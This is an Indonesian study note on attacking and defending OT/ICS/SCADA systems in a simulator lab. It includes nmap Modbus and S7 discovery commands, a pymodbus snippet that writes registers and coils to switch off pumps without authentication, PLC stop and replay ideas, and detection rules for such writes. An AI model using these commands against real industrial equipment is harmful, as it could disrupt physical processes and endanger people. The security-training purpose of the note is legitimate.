# 🏭 Lab — OT/ICS/SCADA Hacking

> [!summary] Ringkasan
> Pelengkap keluarga [[Lab — Jaringan Vulnerable (Networking)|lab jaringan]] untuk **Operational Technology (OT)** — sistem yang mengendalikan **dunia fisik**: pabrik, listrik, air, migas. Berbeda total dari IT: di sini **keselamatan & ketersediaan** lebih utama daripada kerahasiaan, perangkatnya **PLC/RTU/HMI** dengan protokol industri (**Modbus, S7, DNP3, EtherNet/IP**) yang sebagian besar **tanpa autentikasi**. Note ini = konsep OT, setup lab (simulator PLC, **bukan** perangkat produksi), serangan terhadap protokol/PLC, dan pertahanan (segmentasi Purdue, monitoring pasif). Latih **hanya di simulator/lab milikmu** — kesalahan di OT nyata bisa **melukai orang**.

**Bagian dari:** [[Lab — Jaringan Vulnerable (Networking)]] · [[Fondasi (MOC)]]
**Prasyarat:** [[Jaringan Komputer]], [[Model OSI & TCP-IP]], [[Linux Dasar untuk Security]], [[Setup Lab (Virtualisasi)]]; berguna: [[Lab — Serangan Jaringan (Network Pentest)]], [[Scanning & Enumeration]]

---

> [!danger] OT = nyawa, bukan sekadar data
> Di IT, kerusakan = data hilang. Di OT, kerusakan = **turbin meledak, kompresor rusak, pasokan air tercemar, orang celaka**. JANGAN PERNAH scan/serang perangkat OT produksi — bahkan `nmap` biasa bisa **membekukan PLC** rapuh. Semua latihan di sini **wajib** di simulator atau perangkat lab terisolasi. Insiden nyata (Stuxnet, Industroyer, TRITON) menunjukkan taruhannya. Etika: [[00 - START HERE]].

## 🧠 Konsep Inti

### Apa itu OT / ICS / SCADA
- **OT (Operational Technology)** — teknologi yang memantau & mengendalikan proses fisik.
- **ICS (Industrial Control System)** — payung sistem kontrol industri.
- **SCADA (Supervisory Control and Data Acquisition)** — sistem yang **mengawasi & mengendalikan** dari pusat, mengumpulkan data dari lapangan tersebar.
- **DCS** — Distributed Control System (untuk satu pabrik/lokasi).

### Komponen utama
| Komponen | Peran | Analogi IT |
|---|---|---|
| **PLC** (Programmable Logic Controller) | otak kontrol di lapangan (baca sensor → atur aktuator) | "server kecil" tahan-banting |
| **RTU** | unit jarak jauh (mirip PLC, lokasi terpencil) | edge device |
| **HMI** (Human-Machine Interface) | layar operator pantau/kontrol | dashboard |
| **Historian** | database time-series proses | log/SIEM |
| **Engineering Workstation (EWS)** | tempat program PLC ditulis & di-upload | admin workstation |
| **Sensor/Aktuator** | mata & tangan (suhu, katup, motor) | I/O fisik |

### Kenapa OT rawan (beda akar dari IT)
- Protokol industri dirancang **puluhan tahun lalu untuk jaringan tertutup** → **tanpa autentikasi/enkripsi** (siapa saja yang bisa kirim paket = bisa perintah PLC).
- Perangkat **berumur sangat panjang** (10–20 thn), jarang/tak bisa di-patch, OS usang.
- **Uptime di atas segalanya** → reboot/patch ditakuti → kerentanan menumpuk.
- Dulu "air-gapped", kini makin tersambung IT/internet (lihat **Shodan** penuh PLC terekspos).

### CIA dibalik → **AIC / SRP**
Prioritas OT: **Safety → Reliability → Productivity**, lalu baru keamanan data. Urutan CIA dibalik jadi **Availability > Integrity > Confidentiality**. Ini mengubah cara kita uji: **pasif & hati-hati**, bukan agresif.

### Model Purdue (segmentasi referensi)
```text
Level 4/5  : IT / Enterprise (ERP, email, internet)
  --- DMZ industri (IT/OT boundary) ---
Level 3    : Operations (Historian, EWS, MES)
Level 2    : Supervisory (HMI, SCADA server)
Level 1    : Control (PLC, RTU)
Level 0    : Process (sensor, aktuator — dunia fisik)
```
> Serangan biasanya menembus IT (Level 4) → bergerak turun ke OT. Pertahanan inti = **segmentasi ketat antar level** + DMZ industri.

### Protokol industri (target umum)
| Protokol | Port | Catatan keamanan |
|---|---|---|
| **Modbus TCP** | 502 | paling umum, **tanpa auth** — read/write register bebas |
| **Siemens S7comm** | 102 | PLC Siemens (dipakai Stuxnet) |
| **DNP3** | 20000 | utilitas listrik/air |
| **EtherNet/IP / CIP** | 44818 | Allen-Bradley/Rockwell |
| **OPC UA** | 4840 | modern, *bisa* aman (TLS) bila dikonfigurasi |

## 🛠️ Setup Lab OT (simulator — JANGAN perangkat produksi)

```bash
# Semua software, tanpa hardware berbahaya:
#  - OpenPLC          : PLC open-source (runtime + editor) — jadikan "PLC target"
#  - ModbusPal / pymodbus : simulasikan slave Modbus & register
#  - Conpot           : honeypot ICS (simulasi PLC Siemens/Modbus) — bagus utk belajar
#  - GRFICS           : simulasi proses fisik (kilang) + HMI + PLC, visual 3D
#  - Factory I/O      : simulasi proses fisik realistis (berbayar) + sambung OpenPLC
pip install pymodbus
```
> Pola lab: **OpenPLC** sebagai PLC, **GRFICS** sebagai proses fisik + HMI, **Kali** sebagai penyerang — semua VM di jaringan host-only ([[Lab — Setup Jaringan Lab]]).

## ⚔️ Praktik Serangan (di simulator)

### 1. Discovery & enumerasi (HATI-HATI — pakai mode aman)
```bash
# Scan ringan; di OT nyata bahkan ini berisiko → di lab simulator aman.
nmap -Pn -p 502,102,20000,44818,4840 <ip-plc>
nmap --script modbus-discover -p 502 <ip-plc>     # ID device Modbus
nmap --script s7-info -p 102 <ip-plc>             # info PLC Siemens
# Cari perangkat ICS yang terekspos di internet (riset): Shodan/Censys.
```

### 2. Modbus: baca & tulis register (tanpa auth!)
```python
# pymodbus — baca nilai proses lalu paksa ubah (mis. matikan pompa)
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('<ip-plc>', port=502)
print(c.read_holding_registers(0, 10).registers)   # baca 10 register
c.write_register(1, 0)                              # TULIS: ubah setpoint/coil
c.write_coil(0, False)                              # matikan output (mis. relay)
c.close()
```
> Inilah inti kerawanan OT: **tanpa kredensial**, siapa pun di jaringan bisa membaca & **mengubah** kondisi fisik. Tools siap pakai: **modbus-cli**, **mbtget**, modul **Metasploit** `auxiliary/scanner/scada/*`.

### 3. PLC stop/start & manipulasi logika
```text
- Banyak PLC menerima perintah STOP/START tanpa auth (Metasploit modul S7/Modbus).
- Skenario lab: hentikan PLC → proses fisik (di GRFICS) keluar kendali → amati HMI.
- Replay/MITM: tangkap trafik Modbus ([[Lab — Serangan Jaringan (Network Pentest)|ARP spoof]]) lalu replay perintah.
```

### 4. HMI & engineering workstation
```text
- HMI sering aplikasi web/Windows lawas → [[Web Application Hacking (OWASP Top 10)]],
  default cred, CVE OS usang ([[Exploitation & Metasploit]]).
- EWS = jalur Stuxnet: kompromi workstation → upload logika PLC jahat.
```

## 🛡️ Pertahanan (Defending OT)

| Risiko | Mitigasi |
|---|---|
| Protokol tanpa auth | **segmentasi** ketat (Purdue) + DMZ industri; whitelist host yang boleh bicara ke PLC |
| Scan merusak PLC | **monitoring PASIF** saja (tap/SPAN), jangan active-scan OT |
| IT→OT lateral | firewall industri, data diode (satu arah), tak ada akses langsung internet |
| Perangkat tak bisa di-patch | **virtual patching** (IPS industri), kompensasi via isolasi |
| Perintah jahat | deteksi anomali protokol (baseline Modbus normal) |

```text
Monitoring khas OT — PASIF & berbasis baseline:
 - Sensor pasif: Nozomi, Claroty, Dragos, atau Zeek + plugin ICS
 - Aturan deteksi: 'write' Modbus dari host tak dikenal, PLC STOP, scan port 502
 - Map ke MITRE ATT&CK for ICS (taktik: Inhibit Response, Impair Process Control)
```
> Defensif luas: [[Network Security (Firewall, IDS-IPS)]], [[Network Security Lanjutan (NSM-NDR)]] (deteksi pasif), [[Hardening & Vulnerability Management]], [[Incident Response]] (playbook OT berbeda — keselamatan dulu).

## 🧯 Troubleshooting

> [!warning] Gejala → Solusi
> - **OpenPLC tak konek HMI/GRFICS** → cek IP & port 502 terbuka; samakan jaringan host-only.
> - **pymodbus timeout** → PLC simulator belum running atau register di luar rentang; mulai dari address 0.
> - **`nmap` ICS script tak jalan** → perlu `--script` NSE terinstal & port benar (502/102).
> - **Proses GRFICS "meledak"** → memang itu tujuannya saat kontrol diambil alih; reset simulasi.

## 🧰 Tools

- **OpenPLC / pymodbus / ModbusPal** — bangun PLC & slave Modbus simulasi.
- **GRFICS / Factory I/O** — simulasi proses fisik + HMI (lihat dampak serangan).
- **Conpot** — honeypot ICS untuk belajar protokol & deteksi.
- **nmap (NSE scada)**, **modbus-cli / mbtget**, **Metasploit `scanner/scada`** — enum & serang.
- **Wireshark** (dissector Modbus/S7/DNP3) — analisis protokol.
- **Nozomi / Claroty / Dragos / Zeek-ICS** — monitoring pasif (sisi Blue).

## 🔗 Kaitan

- Hub lab jaringan: [[Lab — Jaringan Vulnerable (Networking)]] (OT = jaringan dengan protokol khusus).
- Serangan jaringan yang dipakai: [[Lab — Serangan Jaringan (Network Pentest)]] (ARP spoof/MITM untuk replay Modbus), [[Scanning & Enumeration]].
- HMI/EWS = web & host → [[Web Application Hacking (OWASP Top 10)]], [[Exploitation & Metasploit]].
- **Sisi Blue ↔** [[Network Security (Firewall, IDS-IPS)]], [[Network Security Lanjutan (NSM-NDR)]] (monitoring pasif), [[Hardening & Vulnerability Management]], [[Incident Response]] (playbook OT = keselamatan dulu).
- Kerangka: [[Cyber Kill Chain & MITRE ATT&CK]] → **ATT&CK for ICS** (matriks terpisah).
- Berbatasan dengan: [[Lab — IoT & Embedded Hacking]] (embedded fisik), [[Post-Exploitation & Pivoting]] (IT→OT lateral).

## 🎯 Latihan

- Bangun lab **OpenPLC + GRFICS + Kali** di host-only. Dari Kali, `nmap` port 502, lalu pakai **pymodbus** untuk membaca register proses.
- **Ambil kendali**: tulis register/coil untuk mengubah proses di GRFICS (mis. matikan pompa) dan amati reaksi di HMI — pahami betapa mudahnya tanpa auth.
- (Defensif) Pasang **Conpot** atau **Zeek**, ulangi serangan, dan buat aturan yang mendeteksi "Modbus write dari host tak dikenal".
- Petakan langkah seranganmu ke **MITRE ATT&CK for ICS**.

## 📖 Sumber

- **MITRE ATT&CK for ICS** — https://attack.mitre.org/matrices/ics/
- **OpenPLC Project** — https://openplcproject.com
- **GRFICS** — https://github.com/Fortiphyd/GRFICSv2
- **Conpot (ICS honeypot)** — http://conpot.org
- **NIST SP 800-82** — Guide to OT Security.
- **Dragos / SANS ICS** — blog & kursus ICS515/410.
